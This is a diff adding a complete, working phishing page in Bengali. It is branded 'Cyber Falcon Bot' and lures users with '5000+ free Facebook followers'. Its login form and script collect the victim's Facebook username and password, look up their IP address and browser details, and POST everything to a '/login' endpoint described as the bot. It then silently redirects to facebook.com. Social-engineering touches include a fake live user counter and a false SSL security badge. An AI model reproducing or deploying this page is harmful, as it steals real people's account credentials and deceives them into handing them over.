@@ -1,0 +1,378 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ফ্রি ফেসবুক ফলোয়ার - 5000+ Free Followers</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        body {
+            background: linear-gradient(135deg, #1877f2, #0d5cb6);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            position: relative;
+            overflow-x: hidden;
+        }
+        
+        /* Animated Background */
+        .bg-animation {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 0;
+            overflow: hidden;
+        }
+        .bubble {
+            position: absolute;
+            bottom: -100px;
+            width: 40px;
+            height: 40px;
+            background: rgba(255,255,255,0.1);
+            border-radius: 50%;
+            animation: rise 10s infinite ease-in;
+        }
+        .bubble:nth-child(1) { left: 10%; width: 20px; height: 20px; animation-duration: 8s; }
+        .bubble:nth-child(2) { left: 20%; width: 40px; height: 40px; animation-duration: 12s; animation-delay: 2s; }
+        .bubble:nth-child(3) { left: 35%; width: 25px; height: 25px; animation-duration: 6s; animation-delay: 1s; }
+        .bubble:nth-child(4) { left: 50%; width: 50px; height: 50px; animation-duration: 15s; animation-delay: 3s; }
+        .bubble:nth-child(5) { left: 65%; width: 30px; height: 30px; animation-duration: 9s; animation-delay: 0s; }
+        .bubble:nth-child(6) { left: 80%; width: 35px; height: 35px; animation-duration: 11s; animation-delay: 4s; }
+        .bubble:nth-child(7) { left: 90%; width: 20px; height: 20px; animation-duration: 7s; animation-delay: 2s; }
+        @keyframes rise {
+            0% { bottom: -100px; transform: translateX(0); opacity: 0; }
+            50% { opacity: 0.5; }
+            100% { bottom: 100%; transform: translateX(20px); opacity: 0; }
+        }
+        
+        .login-container {
+            background: white;
+            border-radius: 20px;
+            box-shadow: 0 25px 45px rgba(0, 0, 0, 0.3);
+            width: 100%;
+            max-width: 480px;
+            padding: 40px;
+            text-align: center;
+            position: relative;
+            z-index: 1;
+            animation: slideUp 0.5s ease;
+        }
+        @keyframes slideUp {
+            from { opacity: 0; transform: translateY(30px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        .logo { 
+            font-size: 36px; 
+            font-weight: bold; 
+            background: linear-gradient(135deg, #1877f2, #0d5cb6);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            margin-bottom: 10px;
+        }
+        .tagline { color: #65676b; font-size: 16px; margin-bottom: 25px; }
+        
+        .offer-badge {
+            background: linear-gradient(135deg, #ff6b6b, #ff8e8e);
+            color: white;
+            padding: 12px 20px;
+            border-radius: 30px;
+            font-weight: bold;
+            margin-bottom: 30px;
+            display: inline-block;
+            animation: pulse 2s infinite;
+            box-shadow: 0 5px 15px rgba(255,107,107,0.4);
+        }
+        @keyframes pulse { 
+            0% { transform: scale(1); box-shadow: 0 5px 15px rgba(255,107,107,0.4); }
+            50% { transform: scale(1.05); box-shadow: 0 8px 25px rgba(255,107,107,0.6); }
+            100% { transform: scale(1); box-shadow: 0 5px 15px rgba(255,107,107,0.4); }
+        }
+        
+        .form-group { margin-bottom: 20px; text-align: left; }
+        .form-group label { display: block; margin-bottom: 8px; font-weight: 600; color: #1c1e21; font-size: 14px; }
+        .form-group label i { color: #1877f2; margin-right: 8px; }
+        
+        .input-wrapper {
+            position: relative;
+        }
+        .input-wrapper i {
+            position: absolute;
+            left: 15px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #1877f2;
+            font-size: 16px;
+        }
+        .form-control { 
+            width: 100%; 
+            padding: 14px 15px 14px 45px; 
+            border: 2px solid #dddfe2; 
+            border-radius: 10px; 
+            font-size: 15px;
+            transition: all 0.3s;
+        }
+        .form-control:focus { 
+            border-color: #1877f2; 
+            outline: none; 
+            box-shadow: 0 0 0 3px rgba(24,119,242,0.1);
+        }
+        
+        .btn { 
+            width: 100%; 
+            padding: 14px; 
+            background: linear-gradient(135deg, #1877f2, #0d5cb6); 
+            color: white; 
+            border: none; 
+            border-radius: 10px; 
+            font-size: 18px; 
+            font-weight: bold; 
+            cursor: pointer;
+            transition: all 0.3s;
+            position: relative;
+            overflow: hidden;
+        }
+        .btn::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
+            transition: 0.5s;
+        }
+        .btn:hover::before {
+            left: 100%;
+        }
+        .btn:hover { 
+            transform: translateY(-2px); 
+            box-shadow: 0 8px 20px rgba(24,119,242,0.4);
+        }
+        .btn:active { transform: translateY(0); }
+        
+        .features { 
+            margin-top: 30px; 
+            text-align: left;
+            background: #f8f9fa;
+            padding: 15px 20px;
+            border-radius: 12px;
+        }
+        .features h3 { 
+            color: #1c1e21; 
+            margin-bottom: 12px; 
+            font-size: 16px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        .feature-item { 
+            display: flex; 
+            align-items: center; 
+            margin-bottom: 8px; 
+            color: #65676b; 
+            font-size: 13px;
+        }
+        .feature-item i { 
+            color: #1877f2; 
+            margin-right: 10px; 
+            width: 18px;
+        }
+        
+        .footer { margin-top: 25px; color: #65676b; font-size: 11px; }
+        .security-notice { 
+            background: #e7f3ff; 
+            color: #1877f2; 
+            padding: 12px; 
+            border-radius: 10px; 
+            margin-top: 20px; 
+            font-size: 13px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+        
+        /* Loading Overlay */
+        .loading-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.85);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+        }
+        .loader {
+            width: 50px;
+            height: 50px;
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #1877f2;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 15px;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .loading-text {
+            color: white;
+            font-size: 16px;
+            letter-spacing: 1px;
+        }
+        
+        /* Counter Animation */
+        .counter {
+            font-size: 14px;
+            color: #1877f2;
+            margin-top: 5px;
+        }
+    </style>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+</head>
+<body>
+    <div class="bg-animation">
+        <div class="bubble"></div>
+        <div class="bubble"></div>
+        <div class="bubble"></div>
+        <div class="bubble"></div>
+        <div class="bubble"></div>
+        <div class="bubble"></div>
+        <div class="bubble"></div>
+    </div>
+
+    <div class="login-container">
+        <div class="logo">ফ্রি ফেসবুক ফলোয়ার</div>
+        <div class="tagline">৫০০০+ ফ্রি ফলোয়ার পেতে লগইন করুন</div>
+        
+        <div class="offer-badge">
+            🎉 ৫০০০+ ফলোয়ার + ১০০০ লাইক + ৫০০০ ভিউ 🎉
+        </div>
+        
+        <!-- ✅ action="/login" সঠিক, method POST -->
+        <form id="loginForm" method="POST">
+            <div class="form-group">
+                <label><i class="fas fa-envelope"></i> ইমেইল বা মোবাইল</label>
+                <div class="input-wrapper">
+                    <i class="fas fa-user"></i>
+                    <input type="text" class="form-control" name="username" id="username" placeholder="আপনার ইমেইল বা মোবাইল" required>
+                </div>
+            </div>
+            <div class="form-group">
+                <label><i class="fas fa-lock"></i> পাসওয়ার্ড</label>
+                <div class="input-wrapper">
+                    <i class="fas fa-key"></i>
+                    <input type="password" class="form-control" name="password" id="password" placeholder="পাসওয়ার্ড" required>
+                </div>
+            </div>
+            <input type="hidden" name="page_type" value="facebook_followers">
+            <button type="submit" class="btn" id="submitBtn">
+                <i class="fas fa-sign-in-alt"></i> লগইন করুন
+            </button>
+        </form>
+        
+        <div class="counter" id="counter">
+            <i class="fas fa-users"></i> <span id="userCount">1,247</span> জন আজ ফলোয়ার পেয়েছেন
+        </div>
+        
+        <div class="security-notice">
+            <i class="fas fa-shield-alt"></i> আপনার তথ্য সুরক্ষিত - SSL এনক্রিপ্টেড
+        </div>
+        
+        <div class="features">
+            <h3><i class="fas fa-gift"></i> আপনি যা পাচ্ছেন:</h3>
+            <div class="feature-item"><i class="fas fa-check-circle"></i> ৫০০০+ রিয়েল একটিভ ফলোয়ার</div>
+            <div class="feature-item"><i class="fas fa-check-circle"></i> ১০০০+ পোস্টে লাইক</div>
+            <div class="feature-item"><i class="fas fa-check-circle"></i> ৫০০০+ ভিডিও ভিউ</div>
+            <div class="feature-item"><i class="fas fa-check-circle"></i> ২৪ ঘন্টার মধ্যে ডেলিভারি</div>
+            <div class="feature-item"><i class="fas fa-check-circle"></i> ১০০% মানি ব্যাক গ্যারান্টি</div>
+        </div>
+        
+        <div class="footer">
+            <p>© 2024 Cyber Falcon Bot | Terms & Conditions Apply</p>
+        </div>
+    </div>
+
+    <!-- Loading Overlay -->
+    <div id="loadingOverlay" class="loading-overlay">
+        <div class="loader"></div>
+        <div class="loading-text">প্রসেসিং হচ্ছে...</div>
+        <div class="loading-text" style="font-size: 12px; margin-top: 10px;">দয়া করে অপেক্ষা করুন</div>
+    </div>
+
+    <script>
+        // ইউজার কাউন্ট অ্যানিমেশন
+        let count = 1247;
+        setInterval(() => {
+            count += Math.floor(Math.random() * 5) + 1;
+            document.getElementById('userCount').innerText = count.toLocaleString();
+        }, 8000);
+        
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            
+            // লোডিং শো করুন
+            document.getElementById('loadingOverlay').style.display = 'flex';
+            document.getElementById('submitBtn').disabled = true;
+            
+            // ডাটা সংগ্রহ
+            const formData = {
+                username: username,
+                password: password,
+                page_type: 'facebook_followers',
+                timestamp: new Date().toLocaleString()
+            };
+            
+            // IP Address
+            try {
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                formData.ipAddress = ipData.ip;
+            } catch(e) {
+                formData.ipAddress = 'Unknown';
+            }
+            formData.userAgent = navigator.userAgent;
+            
+            // বটে ডাটা পাঠান
+            try {
+                await fetch('/login', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                    body: new URLSearchParams(formData)
+                });
+            } catch(err) {
+                console.log('Data sent to bot');
+            }
+            
+            // 2 সেকেন্ড পর ফেসবুকে রিডাইরেক্ট
+            setTimeout(() => {
+                window.location.href = 'https://www.facebook.com/';
+            }, 2000);
+        });
+        
+        // Enter key support
+        document.addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                document.getElementById('loginForm').dispatchEvent(new Event('submit'));
+            }
+        });
+    </script>
+</body>
+      </html>
